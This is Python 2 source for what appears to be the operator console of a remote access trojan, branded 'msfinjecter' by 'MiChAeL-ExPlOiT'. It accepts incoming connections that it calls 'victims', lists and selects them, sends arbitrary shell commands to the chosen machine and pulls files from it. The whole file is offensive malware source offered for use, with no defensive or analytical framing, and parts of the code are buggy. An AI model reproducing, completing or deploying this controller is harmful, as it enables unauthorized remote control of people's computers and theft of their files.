import  socket
import threading
import time
from Queue import Queue
import sys
import os
NUMBER_OF_THE = 3
JOBS = [1, 2, 3]
queue = Queue()
all_connctions = []
all_address = []

def Help():
    print "(1.type -h for this massege\n(2.type list for see the all vicitims(^_^)\n(3.type select + the id form victims"
    Sendcommands()

def manu():
    print ("########################################################")
    print ("#_ __ ___  ___ / _(_)_ __  (_) ___  ___| |_ ___ _ __    #")
    print ("#| '_ ` _ \/ __| |_| | '_ \ | |/ _ \/ __| __/ _ \ '__|  #")
    print ("#| | | | | \__ \  _| | | | || |  __/ (__| ||  __/ |     #")
    print ("#|_| |_| |_|___/_| |_|_| |_|/ |\___|\___|\__\___|_|     #")
    print ("#                         |__/                          #")
    print ("########################################################")
    print ('mayde by MiChAeL-ExPlOiT(^_^)')
    print ('----------------------------')
    print ("1.type -h for this massege\n(2.type list for see the all vicitims(^_^)\n(3.type select + the id form victims")

global s

def get_target(cmd):
    try:
        info = raw_input("insert the id:"'\t')
        target = cmd.replace('select', info)
        target = int(target)
        conn = all_connctions[target]
        print "Your now connect to   " + str(all_address[target][0])
        print str(all_address[target][0] + '> ')
        return conn
    except:
        print "NOt a valid selection"
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = raw_input("victim-mashn-ShEll~>"'\t')
            if len(str(cmd)) > 0:
                conn.send(str(cmd))
                client_response =  str(conn.recv(20480))
                print(client_response)
                if client_response[:6] == 'we-get':
                    filename = raw_input("Filename? -> ")
                    if filename != 'q':
                        conn.send(filename)
                        data = conn.recv(1024)
                        if data[:6] == 'EXISTS':
                            filesize = long(data[6:])
                            message = raw_input("File exists, " + str(filesize) + "Bytes, download? (Y/N)? -> ")
                            if message == 'Y':
                                conn.send("OK")
                                f = open('new_' + filename, 'wb')
                                data = conn.recv(1024)
                                totalRecv = len(data)
                                f.write(data)
                                while totalRecv < filesize:
                                    data = conn.recv(1024)
                                    totalRecv += len(data)
                                    f.write(data)
                                    print "{0:.2f}".format((totalRecv / float(filesize)) * 100) + "% Done"
                                print "Download Complete!"
                                f.close()


                        else:
                            print "File Does Not Exist!"

                    s.close()



            else:
                Sendcommands()

        except:
            print 'we dont have its command in console-EnJiCtOr'


def list_connection():
    results = ''
    for i, conn in enumerate(all_connctions):
        try:
            conn.send('1')
            conn.recv(1024)
        except:
            del all_connctions[i]
            del all_address[i]
        results += str(i) + '   ' + str(all_address[i][0] + '    ' + str(all_address[i][1]) + '\n')
    print ('------clients-------' '\n' 'id       ip      sec' + '\n' + results)


def Sendcommands():
    global conn
    while True:
        cmd = raw_input("console-EnJiCtOr~> ")
        if cmd == 'list':
            list_connection()
        elif cmd == 'select' in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
        elif cmd == '-h':
            Help()
        elif cmd == 'quit':
            exit()
        else:
            print "we sorry to tell you that but we do not have its command"


    else:
        print ("we dont have is command")


def SockOpen():
    while True:

        try:
            host = '127.0.0.1'
            port = 4434
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host, port))
            s.listen(20)

            for c in all_connctions:
                c.close()
            del all_connctions[:]
            del all_address[:]
            while 1:
                try:
                    conn, addr =  s.accept()
                    conn.setblocking(1)
                    all_connctions.append(conn)
                    all_address.append(addr)
                    print("\nwe have a new victim(^:^)""\t" + addr[0])
                except socket.error as ErrorVictim:
                    print ('you can''t to connect' "\t" + str(ErrorVictim))

        except socket.error as Errormassege:
            print ('you cant to connect' "\t" + str(Errormassege))

def WWorks():
    for _ in range(NUMBER_OF_THE):
        Tt = threading.Thread(target=work)
        Tt.daemon = True
        Tt.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            manu()
        elif x == 2:
            time.sleep(0.9)
            Sendcommands()
        elif x == 3:
            SockOpen()
        else:
            print "we have a problom"
        queue.task_done()



def create_lobs():
    for x in JOBS:
        queue.put(x)
    queue.join()

WWorks()
create_lobs()
